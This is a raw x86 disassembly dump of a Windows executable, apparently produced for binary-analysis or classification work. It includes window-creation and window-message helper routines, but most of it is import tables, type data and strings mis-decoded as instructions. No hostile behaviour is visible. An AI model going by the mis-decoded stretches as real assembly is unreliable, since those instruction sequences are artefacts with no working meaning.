add [ ebx + 0x5c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x5025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x4025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x3025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x2025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1c25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x1025ffc0 ] cl
push ebp
dec eax
add [ ebx + 0xc25ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x825ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x425ffc0 ] cl
push ebp
dec eax
add [ ebx + 0x25ffc0 ] cl
push ebp
dec eax
add [ ebx - 0x3da0040 ] cl
push esp
dec eax
add [ ebx - 0x7da0040 ] cl
push esp
dec eax
add [ ebx - 0xbda0040 ] cl
push esp
dec eax
add [ ebx - 0xfda0040 ] cl
push esp
dec eax
add [ ebx - 0x13da0040 ] cl
push esp
dec eax
add [ ebx - 0x17da0040 ] cl
push esp
dec eax
add [ ebx - 0x1bda0040 ] cl
push esp
dec eax
add [ ebx - 0x1fda0040 ] cl
push esp
dec eax
add [ ebx - 0x23da0040 ] cl
push esp
dec eax
add [ ebx - 0x27da0040 ] cl
push esp
dec eax
add [ ebx - 0x2bda0040 ] cl
push esp
dec eax
add [ ebx - 0x2fda0040 ] cl
push esp
dec eax
add [ ebx - 0x33da0040 ] cl
push esp
dec eax
add [ ebx - 0x37da0040 ] cl
push esp
dec eax
add [ ebx - 0x3bda0040 ] cl
push esp
dec eax
add [ ebx - 0x3fda0040 ] cl
push esp
dec eax
add [ ebx - 0x43da0040 ] cl
push esp
dec eax
add [ ebx - 0x47da0040 ] cl
push esp
dec eax
add [ ebx - 0x4bda0040 ] cl
push esp
dec eax
add [ ebx - 0x4fda0040 ] cl
push esp
dec eax
add [ ebx - 0x53da0040 ] cl
push esp
dec eax
add [ ebx - 0x57da0040 ] cl
push esp
dec eax
add [ ebx - 0x5bda0040 ] cl
push esp
dec eax
add [ ebx - 0x5fda0040 ] cl
push esp
dec eax
add [ ebx - 0x63da0040 ] cl
push esp
dec eax
add [ ebx - 0x67da0040 ] cl
push esp
dec eax
add [ ebx - 0x6bda0040 ] cl
push esp
dec eax
add [ ebx - 0x6fda0040 ] cl
push esp
dec eax
add [ ebx - 0x73da0040 ] cl
push esp
dec eax
add [ ebx - 0x77da0040 ] cl
push esp
dec eax
add [ ebx - 0x7bda0040 ] cl
push esp
dec eax
add [ ebx - 0x7fda0040 ] cl
push esp
dec eax
add [ ebx + 0x7c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x7825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x7425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x7025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x6025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5425ffc0 ] cl
push esp
dec eax
add [ ebx + 0x5025ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4c25ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4825ffc0 ] cl
push esp
dec eax
add [ ebx + 0x4425ffc0 ] cl
push esp
dec eax
add [ ebx - 0x3f48f040 ] cl
movzx edx dx
shl edx 0x10
or eax edx
retn
ja EnterCriticalSection
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0x3025ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x2c25ffc0 ] cl
push ebx
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FileTimeToDosDateTime
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
imul esp [ edi + 0x68 ] 0x646f0a74
mov eax eax
nop
sub [ eax + eax * 2 ] ah
push es
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
je r-xdata
add [ ebx + 0x2425ffc0 ] cl
push ebx
dec eax
add [ ebx + 0x2025ffc0 ] cl
push ebx
dec eax
mov eax eax
add esi [ ebx + 0x40 ]
add [ ebx - 0x3da0040 ] cl
push ecx
dec eax
add [ ebx - 0x7da0040 ] cl
push ecx
dec eax
add [ ebx - 0xbda0040 ] cl
push ecx
dec eax
add [ ebx + 0x3425ffc0 ] cl
push ebx
dec eax
sub_406e8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402af0
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp + 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402ae0
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x24
sub_406ee4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
call sub_402af0
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x18 ]
push eax
mov eax [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x20 ]
push eax
mov eax [ ebp + 0x24 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push edi
push esi
push 0x0
call CreateWindowExA
mov esi eax
mov eax ebx
call sub_402ae0
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x20
sub_406f3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_407031
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_407059
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407060
retn
sub_40706c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_407091
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407098
retn
sub_4070a4
inc esi
dec eax
add al dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bh
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ah
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh ch
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh dl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh bl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh al
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add al cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add cl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bl cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ah cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add ch cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add dh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add bh cl
inc [ eax ]
add [ esi + eax * 2 + 0x48 ] ah
add [ eax + 0x640000ff ] dh
inc esi
dec eax
add [ ecx + 0x640000ff ] dh
inc esi
dec eax
add [ edx + 0x640000ff ] dh
inc esi
dec eax
add [ ebx + 0x640000ff ] dh
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] dh
dec eax
add [ ebp + 0x640000ff ] dh
inc esi
dec eax
add [ esi + 0x640000ff ] dh
inc esi
dec eax
add [ edi + 0x640000ff ] dh
inc esi
dec eax
add [ eax + 0x640000ff ] bh
inc esi
dec eax
add [ ecx + 0x640000ff ] bh
inc esi
dec eax
add [ edx + 0x640000ff ] bh
inc esi
dec eax
add [ ebx + 0x640000ff ] bh
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] bh
dec eax
add [ ebp + 0x640000ff ] bh
inc esi
dec eax
add [ esi + 0x640000ff ] bh
inc esi
dec eax
add [ edi + 0x640000ff ] bh
inc esi
dec eax
add [ eax + 0x640000ff ] ah
inc esi
dec eax
add [ ecx + 0x640000ff ] ah
inc esi
dec eax
add [ edx + 0x640000ff ] ah
inc esi
dec eax
add [ ebx + 0x640000ff ] ah
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] ah
dec eax
add [ ebp + 0x640000ff ] ah
inc esi
dec eax
add [ esi + 0x640000ff ] ah
inc esi
dec eax
add [ edi + 0x640000ff ] ah
inc esi
dec eax
add [ eax + 0x640000ff ] ch
inc esi
dec eax
add [ ecx + 0x640000ff ] ch
inc esi
dec eax
add [ edx + 0x640000ff ] ch
inc esi
dec eax
add [ ebx + 0x640000ff ] ch
inc esi
dec eax
add [ edi + edi * 8 + 0x46640000 ] ch
dec eax
add [ ebp + 0x550000ff ] ch
mov ebp esp
xor eax eax
push ebp
push sub_4073b9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4073c0
retn
sub_407593
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] cl
inc ebp
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 + 0x40 ] ch
jb r-xdata
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
inc esp
imul esi [ esi + 0x42 ] 0x72655a79
outsd
nop
sbb al 0x77
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
jbe r-xdata
popad
insb
mov eax eax
or al 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi * 2 ] cl
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax + 0x75 ] ch
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x40 ] dh
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jbe r-xdata
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
inc eax
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x77
outsd
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax + 0x75 ] ch
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] cl
inc ebp
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
jbe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ edi + 0x40 ] 0x1
outsd
jb r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] dl
inc ebp
inc ebp
js r-xdata
inc eax
add [ ebx + esi ] bl
rol ah 0x76
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ eax ] ah
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
inc ebp
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
js r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x75 ] ch
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp [ eax + 0x40 ] 0x0
adc [ eax ] al
add [ eax ] al
test [ edi + 0x40 ] dh
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
ja r-xdata
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 ] bl
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edi + esi * 2 + 0x35980040 ] al
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub [ eax + 0x40 ] bh
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
jns r-xdata
inc esp
imul esi [ esi + 0x69 ] 0x78d86564
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004078 ] al
add [ eax ] al
add [ edi + esi * 2 + 0x35980040 ] al
inc eax
add [ ebp + esi + 0x35a80040 ] ah
outsd
jb r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x4f746e49 ] cl
jbe r-xdata
add [ ebx + esi ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esi [ esi + 0x40 ]
imul ebp [ edi + 0x6e ] 0x40766c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
js r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x40788090
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] cl
inc ebp
push edx
popad
outsb
inc ebp
jb r-xdata
inc eax
add al dl
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10004079 ] cl
add [ eax ] dl
add [ eax ] al
add [ edi + esi * 2 + 0x35980040 ] al
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
push ebp
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add [ eax ] al
add [ edi + esi * 2 + 0x35980040 ] al
inc eax
add [ ebp + esi + 0x35a80040 ] ah
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
sbb al 0x33
sub [ eax + 0x40 ] bh
add [ eax ] al
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
dec ebp
popad
je r-xdata
add [ ebx + esi ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jae r-xdata
insb
imul esp [ eax + edx * 2 + 0x6f ] 0x65746e69
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x79
inc eax
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax + 0x74 ] bl
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ecx + 0x40 ] bh
add [ eax ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x100040 ] bl
add [ eax ] al
push 0x98004075
xor eax 0x35a40040
inc eax
add [ eax - 0x53ffbfcb ] ch
xor eax 0x35a00040
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax ] dl
inc ebp
inc ecx
arpl [ ebx + 0x65 ] sp
jae r-xdata
lea eax [ eax ]
inc eax
jpe r-xdata
xor eax [ eax ]
enter 0x40bc 0x0
pop eax
xor eax [ eax ]
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
jns r-xdata
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ecx ] cl
inc ebp
dec edi
jbe r-xdata
add [ ebx ] dh
inc eax
add [ ebx + esi ] bl
mov [ ecx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x40 ] dl
add [ eax ] dl
add [ eax ] al
add [ eax + 0x75 ] ch
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
push esi
imul ebp [ edi + 0x6c ] 0x6f697461
add [ ebx + esi ] bl
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ 0x6e6f4345 ] cl
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx + esi ] bl
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ eax * 2 + 0x61766e49 ] cl
insb
imul esp [ ebx + eax * 2 + 0x61 ] 0x408d7473
add [ eax + 0x7a ] al
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jns r-xdata
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ ebx ] cl
inc ebp
pop edx
jb r-xdata
inc eax
add [ eax + 0x4035 ] ah
shl [ eax ] 0x79
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
or [ eax + eax * 2 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x4f ] bp
jbe r-xdata
add [ ebx + esi ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsb
lea eax [ eax ]
cld
jpe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax + eax ] cl
add [ eax ] al
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
jl r-xdata
jb r-xdata
add [ eax ] al
jbe r-xdata
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ edx ] cl
inc ebp
push eax
jb r-xdata
add [ eax ] dl
add [ eax ] al
add [ eax + 0x75 ] ch
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc ebp
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
add [ eax + eax ] cl
add [ eax ] al
